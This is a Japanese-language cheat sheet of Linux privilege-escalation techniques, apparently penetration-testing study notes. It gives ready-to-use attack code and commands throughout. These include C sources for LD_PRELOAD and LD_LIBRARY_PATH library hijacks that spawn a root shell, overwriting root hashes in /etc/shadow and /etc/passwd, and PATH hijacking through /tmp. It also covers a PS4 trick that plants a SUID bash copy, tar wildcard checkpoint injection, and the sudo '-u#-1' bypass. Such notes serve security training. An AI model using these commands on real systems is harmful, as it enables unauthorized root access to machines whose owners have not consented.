# Linux Privilege Escalation

## 実行フロー
1. コマンドの確認
2. ファイルの確認
3. sudoの確認

## 機密ファイルのパーミッション確認
### /etc/shadow
通常rootユーザーのみ読み取り可能。しかしもし書き込み可能な場合、新しいパスワードハッシュを生成し、rootユーザーのハッシュを上書きする。

新しいパスワードハッシュの生成
```
mkpasswd -m sha-512 [NEW PASSWORD]
```

### /etc/passwd
通常全てのユーザーが読み取り可能だが、書き込みはrootユーザーのみ可能。しかしもし書き込み可能な場合、rootユーザーのパスワードを上書きする。

新しいパスワードの生成
```
openssl passwd [NEW PASSWORD]
```

## ユーザー環境から継承された環境変数の確認
### env_keep オプションの内容を確認する。
```
sudo -l | grep -iF env_keep
```

#### LD_PRELOAD が存在する場合
1. C言語のプログラムを共有ライブラリ(soファイル)にコンパイル
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

preload.c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

2. コマンドの実行
```
sudo LD_PRELOAD=/tmp/preload.so [COMMAND]
```

#### LD_LIBRARY_PATH が存在する場合
1. プログラムが依存関係にある共有ライブラリを調べる。
```
ldd [COMMAND]
```

2. C言語のプログラムを共有ライブラリ(soファイル)にコンパイル
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
```

library_path.c
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

3. コマンドの実行
```
sudo LD_LIBRARY_PATH=/tmp [COMMAND]
```

#### Memo
LD_PRELOAD : プログラム（コマンド）実行の際に最初にロードする共有オブジェクトを指定する環境変数。  
LD_LIBRARY_PATH : 最初に共有オブジェクトを検索しに行くディレクトリを指定する環境変数。  
COMMAND : sudoで実行できるコマンド。

## コマンドの確認
root権限で実行できるコマンドの確認
```
sudo -l
```

## ファイルの確認
### 怪しいスクリプトの調査
1. LinEnumを実行
2. CronTabに設定されているスクリプトの確認（相対パス or 絶対パス）
3. SUID / SGIDファイルの確認
4. その他ファイルの確認（一般ユーザーのホームディレクトリなど。LinEnumのInteresting Filesセクションも参考）

### 内部コマンドの調査
・シェルスクリプトの場合
```
cat [FILE]
```

・バイナリファイルの場合
1. 読み取り可能な文字列を抽出し、内部で実行されているコマンドを確認。
```
strings [FILE]
```

2. システムコール単位での処理の流れから、実行エラーになっているライブラリやファイルなどを確認。
```
strace [FILE]
strace [FILE] 2>&1 | grep -iE "open|access|no such file"
```

### 権限昇格の実行（コマンドの指定方法ごとに）
・相対パスの場合  
tmpディレクトリに同名のスクリプトを作成。
```
echo '/bin/bash -p' | tee /tmp/[FILE]; chmod +x /tmp/[FILE]
export PATH=/tmp:$PATH
```

・絶対パスの場合  
1. スクリプトが配置されているディレクトリに書き込み権限があるか確認
```
ls -la | grep -iF [DIRECTORY]
```

2. スクリプト自体に書き込み権限があるか確認
```
ls -la [FILE]
```

3. Bashのバージョンを確認（デフォルトシェルがBashの場合）
```
/bin/bash --version
```

・Bash < ver4.2-048  
絶対パスの名前の関数を定義する。
```
function [ABSOLUTE PATH] { /bin/bash -p; }
export -f [ABSOLUTE PATH]
```

・Bash < ver4.4  
suid-env2をデバッグモードで実行する。Bashをデバッグモードで実行する場合、環境変数PS4が利用される。PS4には、/bin/bashのスクリプトをtmpディレクトリにコピーし、SUIDを付与するコマンドをセットする。
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p
```

4. ワイルドカードの使用を確認  
tarコマンドなどの引数として*を使用し、かつ実行先のディレクトリに書き込み権限がある場合。touchコマンドの引数には絶対パスを指定しないとエラーになる。
```
touch [FILE PATH]--checkpoint=1
touch [FILE PATH]--checkpoint-action=exec=[PAYLOAD]
```

## sudoの確認
```
sudo -V
```

・sudo =< ver1.8.28  
他のユーザーとしてコマンドを実行できる権限（ALL）が与えられている必要あり。
```
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
```

